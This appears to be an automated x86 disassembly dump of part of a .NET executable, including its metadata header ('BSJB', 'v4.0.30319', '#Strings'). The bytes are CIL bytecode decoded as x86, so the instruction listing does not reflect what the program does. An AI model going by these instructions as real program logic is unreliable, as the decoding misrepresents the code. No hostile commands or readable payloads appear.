  403ade:	1a 00                	sbb    (%eax),%al
  403ae0:	70 a2                	jo     0x403a84
  403ae2:	07                   	pop    %es
  403ae3:	20 dd                	and    %bl,%ch
  403ae5:	00 00                	add    %al,(%eax)
  403ae7:	00 72 d0             	add    %dh,-0x30(%edx)
  403aea:	1a 00                	sbb    (%eax),%al
  403aec:	70 a2                	jo     0x403a90
  403aee:	07                   	pop    %es
  403aef:	20 de                	and    %bl,%dh
  403af1:	00 00                	add    %al,(%eax)
  403af3:	00 72 da             	add    %dh,-0x26(%edx)
  403af6:	1a 00                	sbb    (%eax),%al
  403af8:	70 a2                	jo     0x403a9c
  403afa:	07                   	pop    %es
  403afb:	20 df                	and    %bl,%bh
  403afd:	00 00                	add    %al,(%eax)
  403aff:	00 72 46             	add    %dh,0x46(%edx)
  403b02:	16                   	push   %ss
  403b03:	00 70 a2             	add    %dh,-0x5e(%eax)
  403b06:	07                   	pop    %es
  403b07:	20 e0                	and    %ah,%al
  403b09:	00 00                	add    %al,(%eax)
  403b0b:	00 72 e4             	add    %dh,-0x1c(%edx)
  403b0e:	1a 00                	sbb    (%eax),%al
  403b10:	70 a2                	jo     0x403ab4
  403b12:	07                   	pop    %es
  403b13:	20 e1                	and    %ah,%cl
  403b15:	00 00                	add    %al,(%eax)
  403b17:	00 72 f6             	add    %dh,-0xa(%edx)
  403b1a:	1a 00                	sbb    (%eax),%al
  403b1c:	70 a2                	jo     0x403ac0
  403b1e:	07                   	pop    %es
  403b1f:	20 e2                	and    %ah,%dl
  403b21:	00 00                	add    %al,(%eax)
  403b23:	00 72 00             	add    %dh,0x0(%edx)
  403b26:	1b 00                	sbb    (%eax),%eax
  403b28:	70 a2                	jo     0x403acc
  403b2a:	07                   	pop    %es
  403b2b:	20 e3                	and    %ah,%bl
  403b2d:	00 00                	add    %al,(%eax)
  403b2f:	00 72 0a             	add    %dh,0xa(%edx)
  403b32:	1b 00                	sbb    (%eax),%eax
  403b34:	70 a2                	jo     0x403ad8
  403b36:	07                   	pop    %es
  403b37:	20 e4                	and    %ah,%ah
  403b39:	00 00                	add    %al,(%eax)
  403b3b:	00 72 14             	add    %dh,0x14(%edx)
  403b3e:	1b 00                	sbb    (%eax),%eax
  403b40:	70 a2                	jo     0x403ae4
  403b42:	07                   	pop    %es
  403b43:	20 e5                	and    %ah,%ch
  403b45:	00 00                	add    %al,(%eax)
  403b47:	00 72 1e             	add    %dh,0x1e(%edx)
  403b4a:	1b 00                	sbb    (%eax),%eax
  403b4c:	70 a2                	jo     0x403af0
  403b4e:	07                   	pop    %es
  403b4f:	80 1d 00 00 04 73 32 	sbbb   $0x32,0x73040000
  403b56:	00 00                	add    %al,(%eax)
  403b58:	0a 80 1e 00 00 04    	or     0x400001e(%eax),%al
  403b5e:	2a 1e                	sub    (%esi),%bl
  403b60:	02 28                	add    (%eax),%ch
  403b62:	22 00                	and    (%eax),%al
  403b64:	00 0a                	add    %cl,(%edx)
  403b66:	2a 36                	sub    (%esi),%dh
  403b68:	1f                   	pop    %ds
  403b69:	fd                   	std
  403b6a:	73 7f                	jae    0x403beb
  403b6c:	00 00                	add    %al,(%eax)
  403b6e:	0a 80 22 00 00 04    	or     0x4000022(%eax),%al
  403b74:	2a 1e                	sub    (%esi),%bl
  403b76:	02 28                	add    (%eax),%ch
  403b78:	22 00                	and    (%eax),%al
  403b7a:	00 0a                	add    %cl,(%edx)
  403b7c:	2a 92 02 28 80 00    	sub    0x802802(%edx),%dl
  403b82:	00 0a                	add    %cl,(%edx)
  403b84:	02 28                	add    (%eax),%ch
  403b86:	81 00 00 0a 7e 22    	addl   $0x227e0a00,(%eax)
  403b8c:	00 00                	add    %al,(%eax)
  403b8e:	04 28                	add    $0x28,%al
  403b90:	25 00 00 06 26       	and    $0x26060000,%eax
  403b95:	02 28                	add    (%eax),%ch
  403b97:	81 00 00 0a 28 24    	addl   $0x24280a00,(%eax)
  403b9d:	00 00                	add    %al,(%eax)
  403b9f:	06                   	push   %es
  403ba0:	26 2a 5a 03          	sub    %es:0x3(%edx),%bl
  403ba4:	7e 23                	jle    0x403bc9
  403ba6:	00 00                	add    %al,(%eax)
  403ba8:	04 6f                	add    $0x6f,%al
  403baa:	82 00 00             	addb   $0x0,(%eax)
  403bad:	0a 6f 83             	or     -0x7d(%edi),%ch
  403bb0:	00 00                	add    %al,(%eax)
  403bb2:	0a 2c 02             	or     (%edx,%eax,1),%ch
  403bb5:	17                   	pop    %ss
  403bb6:	2a 16                	sub    (%esi),%dl
  403bb8:	2a 00                	sub    (%eax),%al
  403bba:	00 00                	add    %al,(%eax)
  403bbc:	13 30                	adc    (%eax),%esi
  403bbe:	03 00                	add    (%eax),%eax
  403bc0:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  403bc1:	00 00                	add    %al,(%eax)
  403bc3:	00 01                	add    %al,(%ecx)
  403bc5:	00 00                	add    %al,(%eax)
  403bc7:	11 03                	adc    %eax,(%ebx)
  403bc9:	28 84 00 00 0a 20 1d 	sub    %al,0x1d200a00(%eax,%eax,1)
  403bd0:	03 00                	add    (%eax),%eax
  403bd2:	00 40 8f             	add    %al,-0x71(%eax)
  403bd5:	00 00                	add    %al,(%eax)
  403bd7:	00 28                	add    %ch,(%eax)
  403bd9:	2c 00                	sub    $0x0,%al
  403bdb:	00 06                	add    %al,(%esi)
  403bdd:	80 23 00             	andb   $0x0,(%ebx)
  403be0:	00 04 7e             	add    %al,(%esi,%edi,2)
  403be3:	23 00                	and    (%eax),%eax
  403be5:	00 04 72             	add    %al,(%edx,%esi,2)
  403be8:	28 1b                	sub    %bl,(%ebx)
  403bea:	00 70 6f             	add    %dh,0x6f(%eax)
  403bed:	85 00                	test   %eax,(%eax)
  403bef:	00 0a                	add    %cl,(%edx)
  403bf1:	2c 3b                	sub    $0x3b,%al
  403bf3:	02 7e 1b             	add    0x1b(%esi),%bh
  403bf6:	00 00                	add    %al,(%eax)
  403bf8:	04 28                	add    $0x28,%al
  403bfa:	29 00                	sub    %eax,(%eax)
  403bfc:	00 06                	add    %al,(%esi)
  403bfe:	2c 67                	sub    $0x67,%al
  403c00:	7e 23                	jle    0x403c25
  403c02:	00 00                	add    %al,(%eax)
  403c04:	04 7e                	add    $0x7e,%al
  403c06:	1a 00                	sbb    (%eax),%al
  403c08:	00 04 6f             	add    %al,(%edi,%ebp,2)
  403c0b:	30 00                	xor    %al,(%eax)
  403c0d:	00 0a                	add    %cl,(%edx)
  403c0f:	2d 56 7e 1b 00       	sub    $0x1b7e56,%eax
  403c14:	00 04 7e             	add    %al,(%esi,%edi,2)
  403c17:	23 00                	and    (%eax),%eax
  403c19:	00 04 7e             	add    %al,(%esi,%edi,2)
  403c1c:	1a 00                	sbb    (%eax),%al
  403c1e:	00 04 6f             	add    %al,(%edi,%ebp,2)
  403c21:	86 00                	xchg   %al,(%eax)
  403c23:	00 0a                	add    %cl,(%edx)
  403c25:	0a 06                	or     (%esi),%al
  403c27:	28 2d 00 00 06 2b    	sub    %ch,0x2b060000
  403c2d:	39 02                	cmp    %eax,(%edx)
  403c2f:	7e 1b                	jle    0x403c4c
  403c31:	00 00                	add    %al,(%eax)
  403c33:	04 28                	add    $0x28,%al
  403c35:	29 00                	sub    %eax,(%eax)
  403c37:	00 06                	add    %al,(%esi)
  403c39:	2c 2c                	sub    $0x2c,%al
  403c3b:	7e 23                	jle    0x403c60
  403c3d:	00 00                	add    %al,(%eax)
  403c3f:	04 7e                	add    $0x7e,%al
  403c41:	18 00                	sbb    %al,(%eax)
  403c43:	00 04 6f             	add    %al,(%edi,%ebp,2)
  403c46:	30 00                	xor    %al,(%eax)
  403c48:	00 0a                	add    %cl,(%edx)
  403c4a:	2d 1b 7e 1b 00       	sub    $0x1b7e1b,%eax
  403c4f:	00 04 7e             	add    %al,(%esi,%edi,2)
  403c52:	23 00                	and    (%eax),%eax
  403c54:	00 04 7e             	add    %al,(%esi,%edi,2)
  403c57:	18 00                	sbb    %al,(%eax)
  403c59:	00 04 6f             	add    %al,(%edi,%ebp,2)
  403c5c:	86 00                	xchg   %al,(%eax)
  403c5e:	00 0a                	add    %cl,(%edx)
  403c60:	0b 07                	or     (%edi),%eax
  403c62:	28 2d 00 00 06 02    	sub    %ch,0x2060000
  403c68:	03 28                	add    (%eax),%ebp
  403c6a:	87 00                	xchg   %eax,(%eax)
  403c6c:	00 0a                	add    %cl,(%edx)
  403c6e:	2a 00                	sub    (%eax),%al
  403c70:	13 30                	adc    (%eax),%esi
  403c72:	03 00                	add    (%eax),%eax
  403c74:	1b 00                	sbb    (%eax),%eax
  403c76:	00 00                	add    %al,(%eax)
  403c78:	18 00                	sbb    %al,(%eax)
  403c7a:	00 11                	add    %dl,(%ecx)
  403c7c:	02 28                	add    (%eax),%ch
  403c7e:	88 00                	mov    %al,(%eax)
  403c80:	00 0a                	add    %cl,(%edx)
  403c82:	0a 06                	or     (%esi),%al
  403c84:	25 6f 89 00 00       	and    $0x896f,%eax
  403c89:	0a 20                	or     (%eax),%ah
  403c8b:	80 00 00             	addb   $0x0,(%eax)
  403c8e:	00 60 6f             	add    %ah,0x6f(%eax)
  403c91:	8a 00                	mov    (%eax),%al
  403c93:	00 0a                	add    %cl,(%edx)
  403c95:	06                   	push   %es
  403c96:	2a 1e                	sub    (%esi),%bl
  403c98:	02 28                	add    (%eax),%ch
  403c9a:	22 00                	and    (%eax),%al
  403c9c:	00 0a                	add    %cl,(%edx)
  403c9e:	2a 32                	sub    (%edx),%dh
  403ca0:	02 28                	add    (%eax),%ch
  403ca2:	8b 00                	mov    (%eax),%eax
  403ca4:	00 0a                	add    %cl,(%edx)
  403ca6:	7d 28                	jge    0x403cd0
  403ca8:	00 00                	add    %al,(%eax)
  403caa:	04 2a                	add    $0x2a,%al
  403cac:	13 30                	adc    (%eax),%esi
  403cae:	02 00                	add    (%eax),%al
  403cb0:	3d 00 00 00 19       	cmp    $0x19000000,%eax
  403cb5:	00 00                	add    %al,(%eax)
  403cb7:	11 73 33             	adc    %esi,0x33(%ebx)
  403cba:	00 00                	add    %al,(%eax)
  403cbc:	06                   	push   %es
  403cbd:	0b 07                	or     (%edi),%eax
  403cbf:	7e 8c                	jle    0x403c4d
  403cc1:	00 00                	add    %al,(%eax)
  403cc3:	0a 7d 28             	or     0x28(%ebp),%bh
  403cc6:	00 00                	add    %al,(%eax)
  403cc8:	04 07                	add    $0x7,%al
  403cca:	fe 06                	incb   (%esi)
  403ccc:	34 00                	xor    $0x0,%al
  403cce:	00 06                	add    %al,(%esi)
  403cd0:	73 06                	jae    0x403cd8
  403cd2:	00 00                	add    %al,(%eax)
  403cd4:	0a 73 07             	or     0x7(%ebx),%dh
  403cd7:	00 00                	add    %al,(%eax)
  403cd9:	0a 0a                	or     (%edx),%cl
  403cdb:	06                   	push   %es
  403cdc:	16                   	push   %ss
  403cdd:	6f                   	outsl  %ds:(%esi),(%dx)
  403cde:	8d 00                	lea    (%eax),%eax
  403ce0:	00 0a                	add    %cl,(%edx)
  403ce2:	06                   	push   %es
  403ce3:	6f                   	outsl  %ds:(%esi),(%dx)
  403ce4:	08 00                	or     %al,(%eax)
  403ce6:	00 0a                	add    %cl,(%edx)
  403ce8:	06                   	push   %es
  403ce9:	6f                   	outsl  %ds:(%esi),(%dx)
  403cea:	8e 00                	mov    (%eax),%es
  403cec:	00 0a                	add    %cl,(%edx)
  403cee:	07                   	pop    %es
  403cef:	7b 28                	jnp    0x403d19
  403cf1:	00 00                	add    %al,(%eax)
  403cf3:	04 2a                	add    $0x2a,%al
  403cf5:	1e                   	push   %ds
  403cf6:	02 28                	add    (%eax),%ch
  403cf8:	22 00                	and    (%eax),%al
  403cfa:	00 0a                	add    %cl,(%edx)
  403cfc:	2a 32                	sub    (%edx),%dh
  403cfe:	02 7b 29             	add    0x29(%ebx),%bh
  403d01:	00 00                	add    %al,(%eax)
  403d03:	04 28                	add    $0x28,%al
  403d05:	8f 00                	pop    (%eax)
  403d07:	00 0a                	add    %cl,(%edx)
  403d09:	2a 00                	sub    (%eax),%al
  403d0b:	00 13                	add    %dl,(%ebx)
  403d0d:	30 02                	xor    %al,(%edx)
  403d0f:	00 33                	add    %dh,(%ebx)
  403d11:	00 00                	add    %al,(%eax)
  403d13:	00 1a                	add    %bl,(%edx)
  403d15:	00 00                	add    %al,(%eax)
  403d17:	11 73 35             	adc    %esi,0x35(%ebx)
  403d1a:	00 00                	add    %al,(%eax)
  403d1c:	06                   	push   %es
  403d1d:	0b 07                	or     (%edi),%eax
  403d1f:	02 7d 29             	add    0x29(%ebp),%bh
  403d22:	00 00                	add    %al,(%eax)
  403d24:	04 07                	add    $0x7,%al
  403d26:	fe 06                	incb   (%esi)
  403d28:	36 00 00             	add    %al,%ss:(%eax)
  403d2b:	06                   	push   %es
  403d2c:	73 06                	jae    0x403d34
  403d2e:	00 00                	add    %al,(%eax)
  403d30:	0a 73 07             	or     0x7(%ebx),%dh
  403d33:	00 00                	add    %al,(%eax)
  403d35:	0a 0a                	or     (%edx),%cl
  403d37:	06                   	push   %es
  403d38:	16                   	push   %ss
  403d39:	6f                   	outsl  %ds:(%esi),(%dx)
  403d3a:	8d 00                	lea    (%eax),%eax
  403d3c:	00 0a                	add    %cl,(%edx)
  403d3e:	06                   	push   %es
  403d3f:	6f                   	outsl  %ds:(%esi),(%dx)
  403d40:	08 00                	or     %al,(%eax)
  403d42:	00 0a                	add    %cl,(%edx)
  403d44:	06                   	push   %es
  403d45:	6f                   	outsl  %ds:(%esi),(%dx)
  403d46:	8e 00                	mov    (%eax),%es
  403d48:	00 0a                	add    %cl,(%edx)
  403d4a:	2a 2e                	sub    (%esi),%ch
  403d4c:	28 2c 00             	sub    %ch,(%eax,%eax,1)
  403d4f:	00 06                	add    %al,(%esi)
  403d51:	80 23 00             	andb   $0x0,(%ebx)
  403d54:	00 04 2a             	add    %al,(%edx,%ebp,1)
  403d57:	00 42 53             	add    %al,0x53(%edx)
  403d5a:	4a                   	dec    %edx
  403d5b:	42                   	inc    %edx
  403d5c:	01 00                	add    %eax,(%eax)
  403d5e:	01 00                	add    %eax,(%eax)
  403d60:	00 00                	add    %al,(%eax)
  403d62:	00 00                	add    %al,(%eax)
  403d64:	0c 00                	or     $0x0,%al
  403d66:	00 00                	add    %al,(%eax)
  403d68:	76 34                	jbe    0x403d9e
  403d6a:	2e 30 2e             	xor    %ch,%cs:(%esi)
  403d6d:	33 30                	xor    (%eax),%esi
  403d6f:	33 31                	xor    (%ecx),%esi
  403d71:	39 00                	cmp    %eax,(%eax)
  403d73:	00 00                	add    %al,(%eax)
  403d75:	00 05 00 6c 00 00    	add    %al,0x6c00
  403d7b:	00 04 0c             	add    %al,(%esp,%ecx,1)
  403d7e:	00 00                	add    %al,(%eax)
  403d80:	23 7e 00             	and    0x0(%esi),%edi
  403d83:	00 70 0c             	add    %dh,0xc(%eax)
  403d86:	00 00                	add    %al,(%eax)
  403d88:	f0 0f 00 00          	lock sldt (%eax)
  403d8c:	23 53 74             	and    0x74(%ebx),%edx
  403d8f:	72 69                	jb     0x403dfa
  403d91:	6e                   	outsb  %ds:(%esi),(%dx)
  403d92:	67 73 00             	addr16 jae 0x403d95
  403d95:	00 00                	add    %al,(%eax)
  403d97:	00 60 1c             	add    %ah,0x1c(%eax)
  403d9a:	00 00                	add    %al,(%eax)
  403d9c:	30 1b                	xor    %bl,(%ebx)
  403d9e:	00 00                	add    %al,(%eax)
  403da0:	23 55 53             	and    0x53(%ebp),%edx
  403da3:	00 90 37 00 00 10    	add    %dl,0x10000037(%eax)
  403da9:	00 00                	add    %al,(%eax)
  403dab:	00 23                	add    %ah,(%ebx)
  403dad:	47                   	inc    %edi
  403dae:	55                   	push   %ebp
  403daf:	49                   	dec    %ecx
  403db0:	44                   	inc    %esp
  403db1:	00 00                	add    %al,(%eax)
  403db3:	00 a0 37 00 00 cc    	add    %ah,-0x33ffffc9(%eax)
  403db9:	03 00                	add    (%eax),%eax
  403dbb:	00 23                	add    %ah,(%ebx)
  403dbd:	42                   	inc    %edx
  403dbe:	6c                   	insb   (%dx),%es:(%edi)
  403dbf:	6f                   	outsl  %ds:(%esi),(%dx)
  403dc0:	62 00                	bound  %eax,(%eax)
  403dc2:	00 00                	add    %al,(%eax)
  403dc4:	00 00                	add    %al,(%eax)
  403dc6:	00 00                	add    %al,(%eax)
  403dc8:	02 00                	add    (%eax),%al
  403dca:	00 01                	add    %al,(%ecx)
  403dcc:	57                   	push   %edi
  403dcd:	3d a2 3d 09 0a       	cmp    $0xa093da2,%eax
  403dd2:	00 00                	add    %al,(%eax)
  403dd4:	00 fa                	add    %bh,%dl
  403dd6:	25 33 00 16 00       	and    $0x160033,%eax
  403ddb:	00 01                	add    %al,(%ecx)
  403ddd:	00 00                	add    %al,(%eax)
  403ddf:	00 4a 00             	add    %cl,0x0(%edx)
  403de2:	00 00                	add    %al,(%eax)
  403de4:	0a 00                	or     (%eax),%al
  403de6:	00 00                	add    %al,(%eax)
  403de8:	29 00                	sub    %eax,(%eax)
  403dea:	00 00                	add    %al,(%eax)
  403dec:	36 00 00             	add    %al,%ss:(%eax)
  403def:	00 23                	add    %ah,(%ebx)
  403df1:	00 00                	add    %al,(%eax)
  403df3:	00 8f 00 00 00 01    	add    %cl,0x1000000(%edi)
  403df9:	00 00                	add    %al,(%eax)
  403dfb:	00 0b                	add    %cl,(%ebx)
  403dfd:	00 00                	add    %al,(%eax)
  403dff:	00 01                	add    %al,(%ecx)
  403e01:	00 00                	add    %al,(%eax)
  403e03:	00 1a                	add    %bl,(%edx)
  403e05:	00 00                	add    %al,(%eax)
  403e07:	00 01                	add    %al,(%ecx)
  403e09:	00 00                	add    %al,(%eax)
  403e0b:	00 01                	add    %al,(%ecx)
  403e0d:	00 00                	add    %al,(%eax)
  403e0f:	00 01                	add    %al,(%ecx)
  403e11:	00 00                	add    %al,(%eax)
  403e13:	00 01                	add    %al,(%ecx)
  403e15:	00 00                	add    %al,(%eax)
  403e17:	00 02                	add    %al,(%edx)
  403e19:	00 00                	add    %al,(%eax)
  403e1b:	00 03                	add    %al,(%ebx)
  403e1d:	00 00                	add    %al,(%eax)
  403e1f:	00 02                	add    %al,(%edx)
  403e21:	00 00                	add    %al,(%eax)
  403e23:	00 01                	add    %al,(%ecx)
  403e25:	00 00                	add    %al,(%eax)
  403e27:	00 03                	add    %al,(%ebx)
  403e29:	00 00                	add    %al,(%eax)
  403e2b:	00 06                	add    %al,(%esi)
  403e2d:	00 00                	add    %al,(%eax)
  403e2f:	00 01                	add    %al,(%ecx)
  403e31:	00 00                	add    %al,(%eax)
  403e33:	00 00                	add    %al,(%eax)
  403e35:	00 0a                	add    %cl,(%edx)
  403e37:	00 01                	add    %al,(%ecx)
  403e39:	00 00                	add    %al,(%eax)
  403e3b:	00 00                	add    %al,(%eax)
  403e3d:	00 06                	add    %al,(%esi)
  403e3f:	00 71 00             	add    %dh,0x0(%ecx)
  403e42:	6a 00                	push   $0x0
  403e44:	0a 00                	or     (%eax),%al
  403e46:	8d 00                	lea    (%eax),%eax
  403e48:	78 00                	js     0x403e4a
  403e4a:	0e                   	push   %cs
  403e4b:	00 3b                	add    %bh,(%ebx)
  403e4d:	02 1c 02             	add    (%edx,%eax,1),%bl
  403e50:	06                   	push   %es
  403e51:	00 6a 02             	add    %ch,0x2(%edx)
  403e54:	4f                   	dec    %edi
  403e55:	02 06                	add    (%esi),%al
  403e57:	00 cc                	add    %cl,%ah
  403e59:	02 6a 00             	add    0x0(%edx),%ch
  403e5c:	0a 00                	or     (%eax),%al
  403e5e:	c8 04 78 00          	enter  $0x7804,$0x0
  403e62:	0a 00                	or     (%eax),%al
  403e64:	d8 04 78             	fadds  (%eax,%edi,2)
  403e67:	00 06                	add    %al,(%esi)
  403e69:	00 cc                	add    %cl,%ah
  403e6b:	05 ad 05 06 00       	add    $0x605ad,%eax
  403e70:	df 05 ad 05 06 00    	filds  0x605ad
  403e76:	38 06                	cmp    %al,(%esi)
  403e78:	18 06                	sbb    %al,(%esi)
  403e7a:	06                   	push   %es
  403e7b:	00 58 06             	add    %bl,0x6(%eax)
  403e7e:	18 06                	sbb    %al,(%esi)
  403e80:	06                   	push   %es
  403e81:	00 7c 06 ad          	add    %bh,-0x53(%esi,%eax,1)
  403e85:	05 06 00 b6 06       	add    $0x6b60006,%eax
  403e8a:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  403e8b:	06                   	push   %es
  403e8c:	06                   	push   %es
  403e8d:	00 e9                	add    %ch,%cl
  403e8f:	06                   	push   %es
  403e90:	18 06                	sbb    %al,(%esi)
  403e92:	06                   	push   %es
  403e93:	00 36                	add    %dh,(%esi)
  403e95:	07                   	pop    %es
  403e96:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  403e97:	06                   	push   %es
  403e98:	06                   	push   %es
  403e99:	00 43 07             	add    %al,0x7(%ebx)
  403e9c:	6a 00                	push   $0x0
  403e9e:	0a 00                	or     (%eax),%al
  403ea0:	54                   	push   %esp
  403ea1:	07                   	pop    %es
  403ea2:	78 00                	js     0x403ea4
  403ea4:	06                   	push   %es
  403ea5:	00 72 07             	add    %dh,0x7(%edx)
  403ea8:	60                   	pusha
  403ea9:	07                   	pop    %es
  403eaa:	06                   	push   %es
  403eab:	00 a3 07 99 07 43    	add    %ah,0x43079907(%ebx)
  403eb1:	00 b9 07 00 00 06    	add    %bh,0x6000007(%ecx)
  403eb7:	00 d5                	add    %dl,%ch
  403eb9:	07                   	pop    %es
  403eba:	6a 00                	push   $0x0
  403ebc:	0e                   	push   %cs
  403ebd:	00 03                	add    %al,(%ebx)
  403ebf:	08 f0                	or     %dh,%al
  403ec1:	07                   	pop    %es
  403ec2:	0e                   	push   %cs
  403ec3:	00 2a                	add    %ch,(%edx)
  403ec5:	08 f0                	or     %dh,%al
  403ec7:	07                   	pop    %es
  403ec8:	0e                   	push   %cs
  403ec9:	00 4e 08             	add    %cl,0x8(%esi)
  403ecc:	f0 07                	lock pop %es
  403ece:	06                   	push   %es
  403ecf:	00 9a 08 6a 00 06    	add    %bl,0x6006a08(%edx)
  403ed5:	00 b0 08 a4 08 06    	add    %dh,0x608a408(%eax)
  403edb:	00 e8                	add    %ch,%al
  403edd:	08 a4 08 06 00 03 09 	or     %ah,0x9030006(%eax,%ecx,1)
  403ee4:	6a 00                	push   $0x0
  403ee6:	06                   	push   %es
  403ee7:	00 58 09             	add    %bl,0x9(%eax)
  403eea:	99                   	cltd
  403eeb:	07                   	pop    %es
  403eec:	06                   	push   %es
  403eed:	00 84 09 6a 00 06 00 	add    %al,0x6006a(%ecx,%ecx,1)
  403ef4:	90                   	nop
  403ef5:	09 6a 00             	or     %ebp,0x0(%edx)
  403ef8:	06                   	push   %es
  403ef9:	00 9d 09 99 07 06    	add    %bl,0x6079909(%ebp)
  403eff:	00 a6 09 99 07 06    	add    %ah,0x6079909(%esi)
  403f05:	00 b5 09 99 07 06    	add    %dh,0x6079909(%ebp)
  403f0b:	00 da                	add    %bl,%dl
  403f0d:	09 99 07 06 00 df    	or     %ebx,-0x20fff9f9(%ecx)
  403f13:	09 4f 02             	or     %ecx,0x2(%edi)
  403f16:	06                   	push   %es
  403f17:	00 1e                	add    %bl,(%esi)
  403f19:	0a 6a 00             	or     0x0(%edx),%ch
  403f1c:	06                   	push   %es
  403f1d:	00 7c 0a 18          	add    %bh,0x18(%edx,%ecx,1)
  403f21:	06                   	push   %es
  403f22:	06                   	push   %es
  403f23:	00 8b 0a 6a 00 06    	add    %cl,0x6006a0a(%ebx)
  403f29:	00 ae 0a 99 07 06    	add    %ch,0x607990a(%esi)
  403f2f:	00 b9 0a 99 07 06    	add    %bh,0x607990a(%ecx)
  403f35:	00 df                	add    %bl,%bh
  403f37:	0a c2                	or     %dl,%al
  403f39:	0a 06                	or     (%esi),%al
  403f3b:	00 ef                	add    %ch,%bh
  403f3d:	0a c2                	or     %dl,%al
  403f3f:	0a 06                	or     (%esi),%al
  403f41:	00 1c 0b             	add    %bl,(%ebx,%ecx,1)
  403f44:	c2 0a 06             	ret    $0x60a
  403f47:	00 34 0b             	add    %dh,(%ebx,%ecx,1)
  403f4a:	c2 0a 06             	ret    $0x60a
  403f4d:	00 53 0b             	add    %dl,0xb(%ebx)
  403f50:	c2 0a 06             	ret    $0x60a
  403f53:	00 7c 0b c2          	add    %bh,-0x3e(%ebx,%ecx,1)
  403f57:	0a 06                	or     (%esi),%al
  403f59:	00 90 0b 99 07 06    	add    %dl,0x607990b(%eax)
  403f5f:	00 9d 0b c2 0a 06    	add    %bl,0x60ac20b(%ebp)
  403f65:	00 be 0b c2 0a 06    	add    %bh,0x60ac20b(%esi)
  403f6b:	00 cb                	add    %cl,%bl
  403f6d:	0b c2                	or     %edx,%eax
  403f6f:	0a 06                	or     (%esi),%al
  403f71:	00 ef                	add    %ch,%bh
  403f73:	0b 99 07 06 00 fa    	or     -0x5fff9f9(%ecx),%ebx
  403f79:	0b 99 07 06 00 07    	or     0x7000607(%ecx),%ebx
  403f7f:	0c 99                	or     $0x99,%al
  403f81:	07                   	pop    %es
  403f82:	06                   	push   %es
  403f83:	00 12                	add    %dl,(%edx)
  403f85:	0c 6a                	or     $0x6a,%al
  403f87:	00 06                	add    %al,(%esi)
  403f89:	00 58 0c             	add    %bl,0xc(%eax)
  403f8c:	99                   	cltd
  403f8d:	07                   	pop    %es
  403f8e:	06                   	push   %es
  403f8f:	00 6c 0c c2          	add    %ch,-0x3e(%esp,%ecx,1)
  403f93:	0a 06                	or     (%esi),%al
  403f95:	00 85 0c c2 0a 06    	add    %al,0x60ac20c(%ebp)
  403f9b:	00 9b 0c c2 0a 06    	add    %bl,0x60ac20c(%ebx)
  403fa1:	00 b4 0c c2 0a 06 00 	add    %dh,0x60ac2(%esp,%ecx,1)
  403fa8:	26 0d 99 07 06 00    	es or  $0x60799,%eax
  403fae:	3a 0d 99 07 06 00    	cmp    0x60799,%cl
  403fb4:	51                   	push   %ecx
  403fb5:	0d 6a 00 0e 00       	or     $0xe006a,%eax
  403fba:	83 0d f0 07 0e 00 d4 	orl    $0xffffffd4,0xe07f0
  403fc1:	0d f0 07 0e 00       	or     $0xe07f0,%eax
  403fc6:	0d 0e f7 0d 06       	or     $0x60df70e,%eax
  403fcb:	00 62 0e             	add    %ah,0xe(%edx)
  403fce:	52                   	push   %edx
  403fcf:	0e                   	push   %cs
  403fd0:	06                   	push   %es
  403fd1:	00 6b 0e             	add    %ch,0xe(%ebx)
  403fd4:	52                   	push   %edx
  403fd5:	0e                   	push   %cs
  403fd6:	06                   	push   %es
  403fd7:	00 0e                	add    %cl,(%esi)
  403fd9:	0f 6a 00             	punpckhdq (%eax),%mm0
  403fdc:	0a 00                	or     (%eax),%al
  403fde:	15 0f 78 00 0e       	adc    $0xe00780f,%eax
  403fe3:	00 28                	add    %ch,(%eax)
  403fe5:	0f 1c 02             	cldemote (%edx)
  403fe8:	0e                   	push   %cs
  403fe9:	00 2e                	add    %ch,(%esi)
  403feb:	0f 1c 02             	cldemote (%edx)
  403fee:	0a 00                	or     (%eax),%al
  403ff0:	98                   	cwtl
  403ff1:	0f 78 00             	vmread %eax,(%eax)
  403ff4:	06                   	push   %es
  403ff5:	00 a8 0f a5 06 00    	add    %ch,0x6a50f(%eax)
  403ffb:	00 00                	add    %al,(%eax)
  403ffd:	00 01                	add    %al,(%ecx)
  403fff:	00 00                	add    %al,(%eax)
  404001:	00 00                	add    %al,(%eax)
  404003:	00 01                	add    %al,(%ecx)
  404005:	00 01                	add    %al,(%ecx)
  404007:	00 00                	add    %al,(%eax)
  404009:	00 10                	add    %dl,(%eax)
  40400b:	00 14 00             	add    %dl,(%eax,%eax,1)
  40400e:	1c 00                	sbb    $0x0,%al
  404010:	05 00 01 00 01       	add    $0x1000100,%eax
  404015:	00 82 01 10 00 30    	add    %al,0x30001001(%edx)
  40401b:	00 00                	add    %al,(%eax)
  40401d:	00 05 00 21 00 24    	add    %al,0x24002100
  404023:	00 01                	add    %al,(%ecx)
  404025:	01 10                	add    %edx,(%eax)
  404027:	00 3e                	add    %bh,(%esi)
  404029:	00 1c 00             	add    %bl,(%eax,%eax,1)
  40402c:	05 00 23 00 27       	add    $0x27002300,%eax
  404031:	00 02                	add    %al,(%edx)
  404033:	00 10                	add    %dl,(%eax)
  404035:	00 50 00             	add    %dl,0x0(%eax)
  404038:	00 00                	add    %al,(%eax)
  40403a:	09 00                	or     %eax,(%eax)
  40403c:	23 00                	and    (%eax),%eax
  40403e:	28 00                	sub    %al,(%eax)
  404040:	03 01                	add    (%ecx),%eax
  404042:	10 00                	adc    %al,(%eax)
  404044:	1a 09                	sbb    (%ecx),%cl
  404046:	00 00                	add    %al,(%eax)
  404048:	05 00 24 00 2f       	add    $0x2f002400,%eax
  40404d:	00 00                	add    %al,(%eax)
  40404f:	00 00                	add    %al,(%eax)
  404051:	00 23                	add    %ah,(%ebx)
  404053:	0a 00                	or     (%eax),%al
  404055:	00 05 00 25 00 31    	add    %al,0x31002500
  40405b:	00 03                	add    %al,(%ebx)
  40405d:	01 10                	add    %edx,(%eax)
  40405f:	00 f2                	add    %dh,%dl
  404061:	0c 00                	or     $0x0,%al
  404063:	00 05 00 27 00 31    	add    %al,0x31002700
  404069:	00 03                	add    %al,(%ebx)
  40406b:	01 10                	add    %edx,(%eax)
  40406d:	00 6b 0f             	add    %ch,0xf(%ebx)
  404070:	00 00                	add    %al,(%eax)
  404072:	05 00 28 00 33       	add    $0x33002800,%eax
  404077:	00 03                	add    %al,(%ebx)
  404079:	01 10                	add    %edx,(%eax)
  40407b:	00 ce                	add    %cl,%dh
  40407d:	0f 00 00             	sldt   (%eax)
  404080:	05 00 29 00 35       	add    $0x35002900,%eax
